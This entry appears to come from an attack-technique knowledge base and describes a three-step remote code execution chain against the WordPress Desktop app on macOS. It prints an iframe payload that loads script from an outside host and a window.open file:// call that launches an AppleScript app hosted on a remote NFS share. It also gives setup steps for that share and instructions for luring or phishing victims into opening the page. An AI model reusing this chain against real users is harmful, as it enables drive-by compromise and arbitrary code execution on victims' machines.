---
id: ac-uuid-001
tags:
  - rce
  - wordpress
  - desktop
  - nfs
  - applescript
  - electron
  - macos
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - macOS
  - Desktop
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-WordPress-Page-with-Iframe]]'
  - '[[procedures/Host-Malicious-AppleScript-App-on-NFS-Mount]]'
  - '[[procedures/Lure-Victim-to-View-or-Edit-Page-in-WordPress-Desktop]]'
step_count: 3
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Drive-by Compromise]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:28.124Z'
description: >-
  Exploits improper URL validation in WordPress Desktop's shell.openExternal to
  achieve RCE by luring victims to view a malicious page containing an iframe
  that triggers execution of a remote NFS-hosted AppleScript app.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Drive-by Compromise]]'
  - '[[Windows Command Shell]]'
---
# Remote Code Execution in WordPress Desktop via Malicious Iframe and NFS-Mounted App

Multi-stage attack chain demonstrating a complete attack workflow exploiting a vulnerability in WordPress Desktop's external link handling to achieve arbitrary code execution on macOS victims.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious Page] --> B[Host Remote App]
    B --> C[Lure Victim]
    C --> D[Execute RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (relies on web hosting and NFS setup)

### Target Environment

- macOS with WordPress Desktop app installed
- Access to WordPress.com site for page creation
- NFS server accessible from victim's network

### Initial Access Requirements

- Ability to create or edit pages on a WordPress.com site
- Network access to host NFS share
- Victim must be invited to or visit the site via WordPress Desktop

## Detailed Attack Procedures

### Step 1: Create Malicious Page
procedure: [[procedures/Create-Malicious-WordPress-Page-with-Iframe]]

**Objective**: Embed an iframe in a WordPress page that loads JavaScript to trigger a file:// URL open, exploiting the desktop app's vulnerability.

**Instructions**: Log into WordPress.com and create a new page. Insert HTML with an iframe sourcing a malicious index.html hosted on your server. The index.html contains JavaScript like `window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')` to call shell.openExternal.

```html
<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center>
```

**Expected Output**: Page saves successfully and displays the iframe when previewed in browser (but exploits in desktop app).

**Success Indicators**:
- Page publishes without errors
- Iframe loads JavaScript payload when tested

### Step 2: Host Remote App
procedure: [[procedures/Host-Malicious-AppleScript-App-on-NFS-Mount]]

**Objective**: Set up an NFS share hosting a malicious .app file that executes arbitrary commands via AppleScript when opened.

**Instructions**: Create an AppleScript app (e.g., hack2.app) that runs shell commands like reading /etc/hosts or opening Calculator. Mount it on an NFS server at a path like /net/192.241.239.91/var/nfs/general/. Ensure the NFS share is accessible from the victim's network.

**Expected Output**: .app file is accessible via file:// URL and executes when opened.

**Success Indicators**:
- NFS mount is live and file is reachable
- Test opening the .app locally executes commands

### Step 3: Lure and Execute
procedure: [[procedures/Lure-Victim-to-View-or-Edit-Page-in-WordPress-Desktop]]

**Objective**: Trick the victim into viewing or editing the malicious page in WordPress Desktop, triggering the RCE.

**Instructions**: Invite the target WordPress.com user to collaborate on the page or send a phishing link. When they open it in the desktop app, the iframe loads, JS executes window.open on the file:// URL, and shell.openExternal launches the remote .app, running the payload.

**Expected Output**: Victim's machine executes the AppleScript, e.g., opens Calculator or reads files.

**Success Indicators**:
- Victim confirms viewing/editing the page
- Remote commands execute (e.g., Calculator launches on victim)

## Attack Chain Summary

### Key Achievements

1. Bypassed URL validation in Electron-based WordPress Desktop
2. Achieved RCE via remote NFS file execution without direct access
3. Demonstrated file read and app execution on macOS victim

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution
- [[Drive-by Compromise]] Drive-by Compromise
- [[Windows Command Shell]] Windows Command Shell (adapted for macOS shell scripting)

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
